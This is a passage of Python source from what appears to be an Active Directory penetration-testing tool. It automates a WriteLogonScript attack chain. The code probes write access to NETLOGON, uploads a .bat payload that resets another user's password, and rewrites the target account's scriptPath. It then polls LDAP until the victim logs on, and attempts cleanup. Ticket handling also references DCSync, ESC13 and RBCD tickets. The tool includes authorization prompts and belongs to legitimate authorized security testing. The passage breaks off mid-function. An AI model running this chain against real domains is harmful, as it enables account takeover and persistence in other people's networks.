        posture_snapshot = get_posture(domains_data, domain=domain)
    except Exception:  # noqa: BLE001
        posture_snapshot = None

    # Alias-aware DC detection: a target supplied as an FQDN or short name
    # never string-equals ``kdc_ip``, so the old ``target_host == kdc_ip``
    # compare silently misclassified DCs and drove the wrong altservice
    # (ldap-for-DCSync vs cifs). ``is_dc_host`` matches IP <-> short <-> FQDN
    # <-> HOST$ via the shared host matcher and the workspace inventory.
    is_dc_target = is_dc_host(
        host=target_host,
        domains_data=domains_data,
        domain=domain,
        ip_hostname_inventory=inventory,
    )
    resolution = resolve_spn_or_decide_ntlm(
        target_host=target_host,
        domain=domain,
        domains_data=domains_data,
        ip_hostname_inventory=inventory,
        resolver_ip=kdc_ip,
        posture_snapshot=posture_snapshot,
        is_dc_target=is_dc_target,
    )
    spn_host = resolution.spn_host if resolution.kerberos_viable else target_host
    return spn_host, kdc_ip


def _prepare_kerberos_for_smb_execution(
    shell: Any,
    *,
    operation_name: str,
    domain: str,
    username: str,
    credential: str,
    domain_data: dict[str, Any],
) -> bool:
    """Prepare Kerberos env for one SMB-backed step and refresh expired tickets when possible."""
    if not bool(domain_data.get("kerberos_tickets")):
        return False

    workspace_dir = str(
        getattr(shell, "current_workspace_dir", "")
        or getattr(shell, "_get_workspace_cwd", lambda: "")()
        or ""
    )
    use_kerberos = prepare_kerberos_ldap_environment(
        operation_name=operation_name,
        target_domain=domain,
        workspace_dir=workspace_dir,
        username=str(username),
        user_domain=str(domain),
        domains_data=getattr(shell, "domains_data", {}),
        sync_clock=getattr(shell, "do_sync_clock_with_pdc", None),
    )
    if not use_kerberos:
        return False

    ticket_service = KerberosTicketService()
    ticket_path = ticket_service.get_ticket_for_user(
        workspace_dir=workspace_dir,
        domain=domain,
        username=username,
        domains_data=getattr(shell, "domains_data", {}),
    )
    ticket_state = ticket_service.is_ticket_valid(ticket_path=ticket_path or "")
    if ticket_state is not False:
        return True

    is_ccache_credential = str(credential or "").strip().lower().endswith(".ccache")
    dc_ip = str(domain_data.get("pdc") or "").strip() or None

    # CARVE-OUT — capability-bearing / scoped-ticket axis. An operator-supplied
    # ``.ccache`` may be an ESC13 PAC-injected TGT or an S4U2Proxy/RBCD service
    # ticket whose principal legitimately differs from ``username`` and whose
    # power lives ONLY in that ccache. It must be used AS-IS — re-minting via
    # ``ensure_user_ccache`` would drop the synthetic group SID / scope. The
    # operator context is already bound into the env by
    # ``prepare_kerberos_ldap_environment`` above; preserve it and proceed with
    # Kerberos rather than regenerating credentials.
    if is_ccache_credential:
        print_warning_debug(
            "[writelogonscript] Kerberos ccache appears invalid before SMB operation; "
            "preserving the operator-supplied ticket context instead of regenerating "
            f"credentials for {mark_sensitive(username, 'user')} in "
            f"{mark_sensitive(domain, 'domain')}"
        )
        return True

    # GENERIC branch — password / NT hash for ``username``. Mint a per-user TGT
    # via the SSOT ``ensure_user_ccache`` (posture-aware: AES etypes + salt) and
    # bind the env to THAT ccache. Never return ``use_kerberos=True`` while the
    # env still points at the ambient $KRB5CCNAME (a different principal's TGT —
    # the DA after a DCSync); on mint failure fall back to NTLM so the SMB step
    # authenticates as the intended principal, not whoever's ticket is active.
    print_warning_debug(
        "[writelogonscript] Kerberos ticket expired/absent before SMB operation; "
        f"minting per-user ticket for {mark_sensitive(username, 'user')} in "
        f"{mark_sensitive(domain, 'domain')}"
    )
    from adscan_internal.services.kerberos_ticket_service import ensure_user_ccache

    try:
        minted = ensure_user_ccache(
            shell,
            user=str(username),
            domain=str(domain),
            credential=(str(credential).strip() or None)
            if credential is not None
            else None,
            dc_ip=dc_ip,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            "[writelogonscript] Kerberos ticket mint failed before SMB operation; "
            "falling back to NTLM. "
            f"user={mark_sensitive(username, 'user')} "
            f"domain={mark_sensitive(domain, 'domain')} "
            f"error={mark_sensitive(str(exc), 'text')}"
        )
        return False

    if not str(minted or "").strip():
        # No per-user ticket could be produced. Do NOT return True with the
        # ambient env ccache — fall back to NTLM (or a blocked step downstream).
        print_warning_debug(
            "[writelogonscript] no per-user Kerberos ticket for "
            f"{mark_sensitive(username, 'user')}; falling back to NTLM (refusing "
            "the ambient $KRB5CCNAME principal)"
        )
        return False

    # Bind the env to the freshly minted per-user ccache.
    return prepare_kerberos_ldap_environment(
        operation_name=f"{operation_name} (ticket refresh)",
        target_domain=domain,
        workspace_dir=workspace_dir,
        username=str(username),
        user_domain=str(domain),
        domains_data=getattr(shell, "domains_data", {}),
        sync_clock=getattr(shell, "do_sync_clock_with_pdc", None),
    )


def _execute_writelogonscript_precheck(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    from_label: str,
    to_label: str,
    details: dict[str, Any],
    context_username: str | None,
    context_password: str | None,
) -> tuple[str, dict[str, Any]]:
    """Confirm logon-script staging access for the current execution token.

    Tries a non-intrusive MxAc effective-access check on the target share
    root first (no file written). If MxAc confirms WRITE the precheck passes
    without uploading anything; if MxAc is undetermined (server does not
    honour it) it falls back to the benign test-file upload probe; if MxAc
    definitively shows no WRITE the candidate fails fast.
    """
    from adscan_internal.services.smb_path_access_service import SMBPathAccessService
    from adscan_internal.services.attack_graph_service import (
        _build_writelogonscript_staging_candidates,
    )
    from adscan_internal.services.smb_effective_access_service import (
        query_effective_root_access,
    )

    exec_username = _resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
    )
    if not exec_username:
        return (
            "blocked",
            {"reason": "no_usable_execution_context"},
        )
    password = context_password or _resolve_domain_password(
        shell, domain, exec_username
    )
    if not password:
        return (
            "blocked",
            {
                "reason": "missing_execution_password",
                "user": exec_username,
            },
        )

    domains_data = getattr(shell, "domains_data", None)
    domain_data = (
        domains_data.get(domain)
        if isinstance(domains_data, dict) and isinstance(domains_data.get(domain), dict)
        else {}
    )
    target_host = (
        str(details.get("host") or "").strip()
        or _resolve_default_domain_controller(domain_data, domain)
        or ""
    )
    if not target_host:
        return ("failed", {"reason": "missing_target_host"})

    use_kerberos = _prepare_kerberos_for_smb_execution(
        shell,
        operation_name="WriteLogonScript execution precheck",
        domain=domain,
        username=str(exec_username),
        credential=password,
        domain_data=domain_data,
    )
    spn_host, spn_kdc_ip = _resolve_smb_spn_target(
        shell, target_host=target_host, domain=domain, domain_data=domain_data
    )

    probe_service = SMBPathAccessService()
    candidate_map = {
        f"{str(candidate.get('share') or '').strip().upper()}|{str(candidate.get('path') or '').strip()}": candidate
        for candidate in _build_writelogonscript_staging_candidates(domain)
    }
    detail_candidates = details.get("staging_candidates")
    ordered_candidates: list[dict[str, Any]] = []
    if isinstance(detail_candidates, list):
        validated = []
        unknown = []
        denied = []
        for item in detail_candidates:
            if not isinstance(item, dict):
                continue
            bucket = (
                validated
                if str(item.get("validation") or "").strip().lower() == "validated"
                else denied
                if str(item.get("validation") or "").strip().lower() == "denied"
                else unknown
            )
            bucket.append(item)
        ordered_candidates = validated + unknown
        if not ordered_candidates and denied:
            return (
                "blocked",
                {
                    "reason": "staging_acl_denied",
                    "user": exec_username,
                    "target_host": target_host,
                    "staging_candidates": denied,
                },
            )
    if not ordered_candidates:
        ordered_candidates = list(candidate_map.values())

    attempted_candidates: list[dict[str, Any]] = []
    last_failure: dict[str, Any] | None = None
    for candidate in ordered_candidates:
        share_name = str(candidate.get("share") or "NETLOGON").strip() or "NETLOGON"
        directory_path = str(candidate.get("path") or "").strip()

        # Step 1: non-intrusive MxAc effective-access check on the share root for
        # the current execution token. Confirms WRITE without writing any file.
        effective = query_effective_root_access(
            host=target_host,
            share=share_name,
            username=str(exec_username),
            password=password,
            auth_domain=str(domain),
            domain=str(domain),
            use_kerberos=use_kerberos,
            kdc_host=spn_kdc_ip if use_kerberos else None,
            spn_host=spn_host,
        )
        if effective.succeeded:
            if effective.can_write:
                attempted_candidates.append(
                    {
                        "name": str(candidate.get("name") or ""),
                        "share": share_name,
                        "path": directory_path,
                        "validation": str(candidate.get("validation") or "")
                        .strip()
                        .lower()
                        or "runtime",
                        "success": True,
                        "status_code": "MXAC_WRITE",
                        "error": "",
                    }
                )
                return (
                    "precheck_succeeded",
                    {
                        "user": exec_username,
                        "target_host": target_host,
                        "share": share_name,
                        "path": directory_path,
                        "selected_staging_candidate": str(
                            candidate.get("name") or share_name
                        ),
                        "probe_path": "",
                        "auth_mode": effective.auth_mode,
                        "netlogon_write_confirmed": True,
                        "reason": "netlogon_write_confirmed_mxac",
                        "attempted_candidates": attempted_candidates,
                    },
                )
            # MxAc definitively reports NO write on this candidate root — fail
            # fast for it without an upload, then try the next candidate.
            attempted_candidates.append(
                {
                    "name": str(candidate.get("name") or ""),
                    "share": share_name,
                    "path": directory_path,
                    "validation": str(candidate.get("validation") or "")
                    .strip()
                    .lower()
                    or "runtime",
                    "success": False,
                    "status_code": "MXAC_NO_WRITE",
                    "error": "MxAc effective access reports no write on share root",
                }
            )
            last_failure = {
                "reason": "netlogon_write_denied_mxac",
                "error": "MxAc effective access reports no write on share root",
                "status_code": "MXAC_NO_WRITE",
                "share": share_name,
                "path": directory_path,
                "probe_path": "",
                "auth_mode": effective.auth_mode,
            }
            continue

        # Step 2: MxAc undetermined (server doesn't honour it / transport
        # error) — fall back to the benign test-file upload probe.
        probe_result = probe_service.probe_file_upload(
            target_host=target_host,
            share_name=share_name,
            directory_path=directory_path,
            username=str(exec_username),
            password=password,
            auth_domain=str(domain),
            file_contents=b"@echo off\r\nrem adscan writelogonscript precheck\r\n",
            filename_prefix="adscan-logonscript-precheck-",
            filename_suffix=".bat",
            delete_after=True,
            use_kerberos=use_kerberos,
            kdc_host=spn_kdc_ip if use_kerberos else None,
            spn_host=spn_host,
        )
        attempted_candidates.append(
            {
                "name": str(candidate.get("name") or ""),
                "share": share_name,
                "path": directory_path,
                "validation": str(candidate.get("validation") or "").strip().lower()
                or "runtime",
                "success": probe_result.success,
                "status_code": probe_result.status_code or "",
                "error": probe_result.error_message or "",
            }
        )
        if probe_result.success:
            return (
                "precheck_succeeded",
                {
                    "user": exec_username,
                    "target_host": target_host,
                    "share": share_name,
                    "path": directory_path,
                    "selected_staging_candidate": str(
                        candidate.get("name") or share_name
                    ),
                    "probe_path": probe_result.probed_file_path,
                    "auth_mode": probe_result.auth_mode,
                    "netlogon_write_confirmed": True,
                    "reason": "netlogon_write_probe_succeeded",
                    "attempted_candidates": attempted_candidates,
                },
            )
        last_failure = {
            "reason": "netlogon_write_probe_failed",
            "error": probe_result.error_message or "",
            "status_code": probe_result.status_code or "",
            "share": share_name,
            "path": directory_path,
            "probe_path": probe_result.probed_file_path,
            "auth_mode": probe_result.auth_mode,
        }

    return (
        "failed",
        {
            "user": exec_username,
            "target_host": target_host,
            "netlogon_write_confirmed": False,
            "attempted_candidates": attempted_candidates,
            **(last_failure or {"reason": "netlogon_write_probe_failed"}),
        },
    )


def _resolve_writelogonscript_next_step_strategy(
    *,
    summary: dict[str, Any],
    current_step_index: int,
    current_to_label: str,
) -> dict[str, Any] | None:
    """Return the supported chained-step strategy for one WriteLogonScript edge."""
    steps = summary.get("steps") if isinstance(summary.get("steps"), list) else []
    if current_step_index < 0 or current_step_index >= len(steps) - 1:
        return None
    next_step = steps[current_step_index + 1]
    if not isinstance(next_step, dict):
        return None
    next_action = str(next_step.get("action") or "").strip().lower()
    next_details = (
        next_step.get("details") if isinstance(next_step.get("details"), dict) else {}
    )
    next_from = str(next_details.get("from") or "").strip()
    next_to = str(next_details.get("to") or "").strip()
    if next_action != "forcechangepassword":
        return None
    if current_to_label and next_from and current_to_label.upper() != next_from.upper():
        return None
    return {
        "strategy_key": "force_change_password",
        "next_step_index": current_step_index + 1,
        "next_action": str(next_step.get("action") or "").strip(),
        "target_user_label": next_to,
        "chained_step_index": current_step_index + 1,
        "chained_step_action": str(next_step.get("action") or "").strip(),
        "chained_step_from_label": next_from,
        "chained_step_to_label": next_to,
    }


def _extract_account_name_from_label(value: str) -> str:
    """Return the account portion from one ``NAME@DOMAIN`` label when possible."""
    label = str(value or "").strip()
    if not label:
        return ""
    return label.split("@", 1)[0].strip()


def _execute_writelogonscript_force_change_password_strategy(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    current_step_index: int,
    from_label: str,
    to_label: str,
    details: dict[str, Any],
    context_username: str | None,
    context_password: str | None,
    precheck_notes: dict[str, Any],
) -> tuple[str, dict[str, Any]]:
    """Stage a ForceChangePassword payload through one logon script."""
    from adscan_internal.services import ExploitationService
    from adscan_internal.services.smb_path_access_service import SMBPathAccessService

    strategy = _resolve_writelogonscript_next_step_strategy(
        summary=summary,
        current_step_index=current_step_index,
        current_to_label=to_label,
    )
    if not isinstance(strategy, dict):
        return ("unsupported_strategy", {"reason": "unsupported_next_step_strategy"})

    exec_username = _resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
    )
    password = context_password or _resolve_domain_password(
        shell, domain, exec_username
    )
    if not exec_username or not password:
        return (
            "blocked",
            {
                "reason": "missing_execution_password",
                "user": exec_username or "",
            },
        )

    target_host = str(
        precheck_notes.get("target_host") or details.get("host") or ""
    ).strip()
    if not target_host:
        return ("failed", {"reason": "missing_target_host"})

    target_object = str(
        details.get("target_dn") or ""
    ).strip() or _extract_account_name_from_label(to_label)
    next_target_label = str(strategy.get("target_user_label") or "").strip()
    next_target_user = _extract_account_name_from_label(next_target_label)
    if not target_object or not next_target_user:
        return (
            "failed",
            {
                "reason": "missing_target_selector",
                "target_object": target_object,
                "next_target_user": next_target_user,
            },
        )

    non_interactive = is_non_interactive(shell)
    fcp_policy = _resolve_password_policy_for_execution(
        shell,
        domain=domain,
        target_user=next_target_user,
        username=exec_username,
        password=password,
    )
    generated_password = generate_compliant_password(fcp_policy, machine=False)
    selected_password = generated_password
    if not non_interactive:
        selected_password = (
            Prompt.ask(
                f"Password to set on {next_target_label}",
                default=generated_password,
            ).strip()
            or generated_password
        )
    policy_ok, _policy_unmet = validate_against_policy(selected_password, fcp_policy)
    if not policy_ok:
        return (
            "blocked",
            {
                "reason": "invalid_followup_password",
                "next_target_user": next_target_user,
            },
        )

    payload = build_force_change_password_logon_script(
        target_username=next_target_user,
        new_password=selected_password,
        filename_suffix_token=secrets.token_hex(4),
    )

    domain_data = (
        getattr(shell, "domains_data", {}).get(domain, {})
        if isinstance(getattr(shell, "domains_data", {}), dict)
        else {}
    )
    use_kerberos = _prepare_kerberos_for_smb_execution(
        shell,
        operation_name="WriteLogonScript ForceChangePassword staging",
        domain=domain,
        username=str(exec_username),
        credential=password,
        domain_data=domain_data,
    )
    spn_host, spn_kdc_ip = _resolve_smb_spn_target(
        shell, target_host=target_host, domain=domain, domain_data=domain_data
    )

    from adscan_internal.cli.exploits import _resolve_impacket_executor_ccache

    exec_ccache = (
        _resolve_impacket_executor_ccache(shell, domain, exec_username)
        if use_kerberos
        else None
    )
    service = ExploitationService()
    previous_script_path = ""
    previous_script_path_readable = False
    get_attrs_result = service.acl.get_object_attributes(
        pdc_host=target_host,
        domain=domain,
        username=exec_username,
        password=password,
        target_object=target_object,
        attribute_names=("scriptPath",),
        kerberos=use_kerberos,
        ccache=exec_ccache,
        timeout=180,
    )
    if get_attrs_result.success:
        previous_script_path = str(
            get_attrs_result.attributes.get("scriptPath") or ""
        ).strip()
        previous_script_path_readable = True
    previous_script_path_original = previous_script_path
    stale_managed_script_path = ""
    stale_managed_script_deleted = False
    stale_managed_script_delete_error = ""
    if previous_script_path_readable and _is_adscan_managed_logon_script_path(
        previous_script_path
    ):
        stale_managed_script_path = previous_script_path
        previous_script_path = ""
        print_warning(
            "WriteLogonScript found a stale ADscan-managed scriptPath on the target user. "
            "ADscan will replace it and will not restore the stale path afterwards."
        )
        print_info_debug(
            "[writelogonscript] stale managed scriptPath detected: "
            f"target={mark_sensitive(to_label, 'user')} "
            f"script_path={mark_sensitive(stale_managed_script_path, 'path')}"
        )
    if _is_audit_mode(shell):
        marked_target = mark_sensitive(to_label, "user")
        marked_executor = mark_sensitive(exec_username, "user")
        marked_next_target = mark_sensitive(
            next_target_label or next_target_user, "user"
        )
        marked_share = mark_sensitive(
            str(precheck_notes.get("share") or "NETLOGON"), "text"
        )
        marked_path = mark_sensitive(str(precheck_notes.get("path") or "\\"), "path")
        cleanup_notes: list[str] = []
        if stale_managed_script_path:
            cleanup_notes.append(
                f"The target currently points to an older ADscan artifact {mark_sensitive(stale_managed_script_path, 'path')}; ADscan will replace it and clear the stale restore baseline."
            )
        elif previous_script_path_readable and previous_script_path:
            cleanup_notes.append(
                f"The target already has scriptPath set to {mark_sensitive(previous_script_path, 'path')}; ADscan will overwrite it temporarily and then restore it."
            )
        elif previous_script_path_readable:
            cleanup_notes.append(
                "The target currently has no scriptPath set; ADscan will add one temporarily and then clear it."
            )
        else:
            cleanup_notes.append(
                "ADscan could not read the existing scriptPath value; cleanup will be best-effort only."
            )
        cleanup_notes.append(
            "If cleanup fails, the staged script or scriptPath change may remain until you remove them manually."
        )
        print_system_change_warning(
            title="[bold yellow]Disruptive Operation: WriteLogonScript[/bold yellow]",
            summary=(
                f"WriteLogonScript is disruptive in audit mode.\nExecution user: {marked_executor}\n"
                f"Logon-script target: {marked_target}\nFollow-up action: reset password for {marked_next_target}\n"
                f"Staging location: {marked_share} -> {marked_path}"
            ),
            planned_changes=[
                "Upload a .bat payload to the selected staging share.",
                "Overwrite scriptPath on the target user.",
                "Wait for the user to log on so the payload runs.",
                "Attempt to restore the original scriptPath and delete the staged file once the downstream credential is confirmed.",
            ],
            impact_notes=[
                "This changes a user logon script and depends on an interactive logon on the target account.",
            ],
            cleanup_notes=cleanup_notes,
            authorization_note=(
                "Only continue if you are explicitly authorized to stage a temporary logon script in this environment."
            ),
        )
        if non_interactive:
            print_info_debug(
                "[writelogonscript] non-interactive audit execution defaulted to 'No' for disruptive staging"
            )
            return (
                "blocked",
                {"reason": "operator_cancelled_disruptive_writelogonscript"},
            )
        if not Confirm.ask("Proceed with WriteLogonScript staging?", default=False):
            return (
                "blocked",
                {"reason": "operator_cancelled_disruptive_writelogonscript"},
            )

    upload_service = SMBPathAccessService()
    if stale_managed_script_path:
        stale_delete_result = upload_service.delete_file(
            target_host=target_host,
            share_name=str(precheck_notes.get("share") or "NETLOGON").strip()
            or "NETLOGON",
            file_path=_join_smb_path(
                str(precheck_notes.get("path") or "").strip(), stale_managed_script_path
            ),
            username=str(exec_username),
            password=password,
            auth_domain=str(domain),
            use_kerberos=use_kerberos,
            kdc_host=spn_kdc_ip if use_kerberos else None,
            spn_host=spn_host,
        )
        stale_managed_script_deleted = bool(stale_delete_result.success)
        stale_managed_script_delete_error = str(
            stale_delete_result.error_message or ""
        ).strip()
        if stale_managed_script_deleted:
            print_info(
                "WriteLogonScript removed the stale ADscan-managed payload before staging the new one."
            )
        elif stale_managed_script_delete_error:
            print_info_debug(
                "[writelogonscript] stale managed payload delete failed; continuing with unique filename: "
                f"target={mark_sensitive(to_label, 'user')} "
                f"path={mark_sensitive(stale_managed_script_path, 'path')} "
                f"error={mark_sensitive(stale_managed_script_delete_error, 'text')}"
            )
    upload_result = upload_service.upload_file(
        target_host=target_host,
        share_name=str(precheck_notes.get("share") or "NETLOGON").strip() or "NETLOGON",
        directory_path=str(precheck_notes.get("path") or "").strip(),
        username=str(exec_username),
        password=password,
        auth_domain=str(domain),
        file_contents=payload.file_contents,
        remote_filename=payload.filename,
        delete_after=False,
        use_kerberos=use_kerberos,
        kdc_host=spn_kdc_ip if use_kerberos else None,
        spn_host=spn_host,
    )
    if not upload_result.success:
        return (
            "failed",
            {
                "reason": "payload_upload_failed",
                "user": exec_username,
                "share": upload_result.share_name,
                "path": upload_result.directory_path,
                "error": upload_result.error_message or "",
                "status_code": upload_result.status_code or "",
            },
        )
    set_result = service.acl.set_user_logon_script(
        pdc_host=target_host,
        domain=domain,
        username=exec_username,
        password=password,
        target_object=target_object,
        script_path=payload.script_path_value,
        kerberos=use_kerberos,
        ccache=exec_ccache,
        timeout=180,
    )
    if not set_result.success:
        return (
            "failed",
            {
                "reason": "scriptpath_update_failed",
                "user": exec_username,
                "target_object": target_object,
                "share": upload_result.share_name,
                "path": upload_result.directory_path,
                "uploaded_file_path": upload_result.uploaded_file_path,
                "raw_output": set_result.raw_output or "",
                "error": set_result.error_message or "",
            },
        )

    return (
        "payload_staged",
        {
            "reason": "writelogonscript_forcechangepassword_staged",
            "payload_strategy": "force_change_password",
            "user": exec_username,
            "target_host": target_host,
            "share": upload_result.share_name,
            "path": upload_result.directory_path,
            "uploaded_file_path": upload_result.uploaded_file_path,
            "script_relative_path": payload.script_path_value,
            "script_filename": payload.filename,
            "scriptpath_target_object": target_object,
            "previous_script_path": previous_script_path,
            "previous_script_path_readable": previous_script_path_readable,
            "previous_script_path_original": previous_script_path_original,
            "stale_managed_script_path": stale_managed_script_path,
            "stale_managed_script_deleted": stale_managed_script_deleted,
            "stale_managed_script_delete_error": stale_managed_script_delete_error,
            "scriptpath_updated": True,
            "next_step_index": int(strategy.get("next_step_index") or -1),
            "next_step_action": str(
                strategy.get("next_action") or "ForceChangePassword"
            ),
            "next_step_target_user": next_target_user,
            "chained_step_index": int(strategy.get("chained_step_index") or -1),
            "chained_step_action": str(
                strategy.get("chained_step_action") or strategy.get("next_action") or ""
            ),
            "chained_step_from_label": str(
                strategy.get("chained_step_from_label") or to_label or ""
            ),
            "chained_step_to_label": str(
                strategy.get("chained_step_to_label")
                or strategy.get("target_user_label")
                or ""
            ),
            "generated_password": selected_password,
            "target_login_required": True,
            "auth_mode": upload_result.auth_mode,
            "selected_staging_candidate": str(
                precheck_notes.get("selected_staging_candidate") or ""
            ),
            "cleanup_pending": True,
        },
    )


def _mark_writelogonscript_cleanup_panel(
    *,
    target_user: str,
    uploaded_file_path: str,
    target_object: str,
    error_summary: str,
) -> None:
    """Render a strong operator-facing warning when cleanup could not complete."""
    lines = [
        "WriteLogonScript cleanup did not complete automatically.",
        "",
        f"Target user: {mark_sensitive(target_user or 'unknown', 'user')}",
        f"Uploaded script: {mark_sensitive(uploaded_file_path or 'unknown', 'path')}",
        f"Target object: {mark_sensitive(target_object or 'unknown', 'text')}",
        "",
        "Manual cleanup is required before closing this engagement.",
        f"Error: {mark_sensitive(error_summary or 'unknown', 'text')}",
    ]
    print_panel(
        "\n".join(lines),
        title="Manual Cleanup Required",
        border_style="red",
        expand=False,
    )


def _poll_writelogonscript_followup_credential(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    from_label: str,
    to_label: str,
    target_user: str,
    target_password: str,
) -> dict[str, Any]:
    """Poll for the downstream credential created by a staged logon script.

    The logon script only becomes effective once the target user logs on. This
    helper waits in short intervals, verifies the staged password silently, and
    preserves detailed timing/attempt metadata in the step notes so operators
    can understand whether the path is still pending or already confirmed.
    """
    initial_wait_seconds = _env_int(
        "ADSCAN_WRITELOGONSCRIPT_POLL_SECONDS",
        60,
        minimum=5,
    )
    extend_wait_seconds = _env_int(
        "ADSCAN_WRITELOGONSCRIPT_POLL_EXTEND_SECONDS",
        initial_wait_seconds,
        minimum=5,
    )
    interval_seconds = _env_int(
        "ADSCAN_WRITELOGONSCRIPT_POLL_INTERVAL_SECONDS",
        5,
        minimum=1,
    )
    max_extensions = _env_int(
        "ADSCAN_WRITELOGONSCRIPT_POLL_MAX_EXTENSIONS",
        10,
        minimum=0,
    )
    auto_extend = is_non_interactive(shell) or _env_flag_enabled(
        "ADSCAN_WRITELOGONSCRIPT_AUTO_EXTEND"
    )

    attempts = 0
    total_wait_seconds = 0
    current_wait_budget = initial_wait_seconds
    extensions_used = 0
    started_at = datetime.now(UTC)

    marked_target_user = mark_sensitive(target_user, "user")
    marked_domain = mark_sensitive(domain, "domain")
    marked_from = mark_sensitive(from_label, "user")
    marked_to = mark_sensitive(to_label, "user")
    step_count = (
        len(summary.get("steps", [])) if isinstance(summary.get("steps"), list) else 0
    )
    print_info(
        "WriteLogonScript validation started: polling LDAP for "
        f"{marked_target_user}@{marked_domain} for up to {initial_wait_seconds}s."
    )
    print_info_debug(
        "[writelogonscript] polling context initialized: "
        f"from={marked_from} to={marked_to} target={marked_target_user} "
        f"domain={marked_domain} summary_steps={step_count}"
    )

    while True:
        deadline = time.monotonic() + current_wait_budget
        print_info_debug(
            "[writelogonscript] follow-up credential polling window started: "
            f"domain={marked_domain} target={marked_target_user} "
            f"budget_seconds={current_wait_budget} interval_seconds={interval_seconds} "
            f"extensions_used={extensions_used}"
        )
        while True:
            attempts += 1
            print_info_debug(
                "[writelogonscript] polling attempt: "
                f"domain={marked_domain} target={marked_target_user} "
                f"attempt={attempts} waited_seconds={total_wait_seconds}"
            )
            verified = False
            try:
                verified = bool(
                    shell.verify_domain_credentials(
                        domain,
                        target_user,
                        target_password,
                        ui_silent=True,
                    )
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_info_debug(
                    "[writelogonscript] follow-up verification attempt failed: "
                    f"target={marked_target_user} error={exc}"
                )
            if verified:
                detected_at = datetime.now(UTC)
                elapsed_seconds = max(
                    0,
                    int((detected_at - started_at).total_seconds()),
                )
                print_info(
                    "WriteLogonScript validation succeeded: "
                    f"{marked_target_user}@{marked_domain} authenticated after {elapsed_seconds}s."
                )
                return {
                    "verification_status": "confirmed",
                    "verification_attempts": attempts,
                    "verification_wait_seconds": elapsed_seconds,
                    "verification_started_at": started_at.isoformat(),
                    "verification_completed_at": detected_at.isoformat(),
                    "verification_extensions_used": extensions_used,
                    "target_login_required": False,
                }

            remaining_seconds = deadline - time.monotonic()
            if remaining_seconds <= 0:
                break
            sleep_seconds = min(interval_seconds, max(1, int(remaining_seconds)))
            print_info_debug(
                "[writelogonscript] credential not active yet: "
                f"target={marked_target_user} sleeping_seconds={sleep_seconds} "
                f"remaining_seconds={max(0, int(remaining_seconds))}"
            )
            time.sleep(sleep_seconds)
            total_wait_seconds += sleep_seconds

        timeout_at = datetime.now(UTC)
        elapsed_seconds = max(0, int((timeout_at - started_at).total_seconds()))
        print_warning(
            "WriteLogonScript validation is still pending: "
            f"{marked_target_user}@{marked_domain} did not authenticate within {elapsed_seconds}s."
        )
        if extensions_used >= max_extensions:
            print_info_debug(
                "[writelogonscript] maximum polling extensions reached: "
                f"target={marked_target_user} max_extensions={max_extensions}"
            )
            return {
                "verification_status": "pending",
                "verification_attempts": attempts,
                "verification_wait_seconds": elapsed_seconds,
                "verification_started_at": started_at.isoformat(),
                "verification_completed_at": timeout_at.isoformat(),
                "verification_extensions_used": extensions_used,
                "target_login_required": True,
            }

        if auto_extend:
            extensions_used += 1
            current_wait_budget = extend_wait_seconds
            print_info(
                "WriteLogonScript validation extended automatically: "
                f"waiting another {extend_wait_seconds}s for {marked_target_user}@{marked_domain}."
            )
            continue

        if Confirm.ask(
            f"Keep polling {marked_target_user}@{marked_domain} for another {extend_wait_seconds}s?",
            default=True,
        ):
            extensions_used += 1
            current_wait_budget = extend_wait_seconds
            print_info(
                "WriteLogonScript validation extended by operator: "
                f"waiting another {extend_wait_seconds}s."
            )
            continue

        return {
            "verification_status": "pending",
            "verification_attempts": attempts,
            "verification_wait_seconds": elapsed_seconds,
            "verification_started_at": started_at.isoformat(),
            "verification_completed_at": timeout_at.isoformat(),
            "verification_extensions_used": extensions_used,
            "target_login_required": True,
        }


def _attempt_writelogonscript_cleanup_if_ready(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
) -> None:
    """Cleanup staged WriteLogonScript artifacts once the downstream credential exists."""
    from adscan_internal.services import ExploitationService
    from adscan_internal.services.smb_path_access_service import SMBPathAccessService

    steps = summary.get("steps") if isinstance(summary.get("steps"), list) else []
    if not isinstance(steps, list):
        return

    for step in steps:
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        status = str(step.get("status") or "").strip().lower()
        if action != "writelogonscript" or status not in {"attempted", "success"}:
            continue
        details = step.get("details") if isinstance(step.get("details"), dict) else {}
        if not bool(details.get("cleanup_pending")):
            continue
        if (
            str(details.get("payload_strategy") or "").strip().lower()
            != "force_change_password"
        ):
            continue

        next_target_user = str(details.get("next_step_target_user") or "").strip()
        generated_password = str(details.get("generated_password") or "").strip()
        if not next_target_user or not generated_password:
            continue
        stored_target_credential = _get_stored_domain_credential_for_user(
            shell,
            domain=domain,
            username=next_target_user,
        )
        if stored_target_credential != generated_password:
            continue

        cleanup_user = str(details.get("user") or "").strip()
        cleanup_password = _resolve_domain_password(shell, domain, cleanup_user)
        target_host = str(details.get("target_host") or "").strip()
        share_name = str(details.get("share") or "").strip()
        uploaded_file_path = str(details.get("uploaded_file_path") or "").strip()
        target_object = str(details.get("scriptpath_target_object") or "").strip()
        previous_script_path = str(details.get("previous_script_path") or "").strip()
        previous_readable = bool(details.get("previous_script_path_readable"))
        cleanup_domain_data = (
            getattr(shell, "domains_data", {}).get(domain, {})
            if isinstance(getattr(shell, "domains_data", {}), dict)
            else {}
        )
        use_kerberos = _prepare_kerberos_for_smb_execution(
            shell,
            operation_name="WriteLogonScript cleanup",
            domain=domain,
            username=cleanup_user,
            credential=cleanup_password or "",
            domain_data=cleanup_domain_data
            if isinstance(cleanup_domain_data, dict)
            else {},
        )
        spn_host, spn_kdc_ip = _resolve_smb_spn_target(
            shell,
            target_host=target_host,
            domain=domain,
            domain_data=cleanup_domain_data
            if isinstance(cleanup_domain_data, dict)
            else {},
        )

        cleanup_notes = dict(details)
        cleanup_notes["cleanup_checked_at"] = datetime.now(UTC).isoformat()
        cleanup_notes["cleanup_trigger_user"] = next_target_user

        if (
            not cleanup_user
            or not cleanup_password
            or not target_host
            or not share_name
            or not uploaded_file_path
            or not target_object
        ):
            cleanup_notes.update(
                {
                    "cleanup_status": "failed",
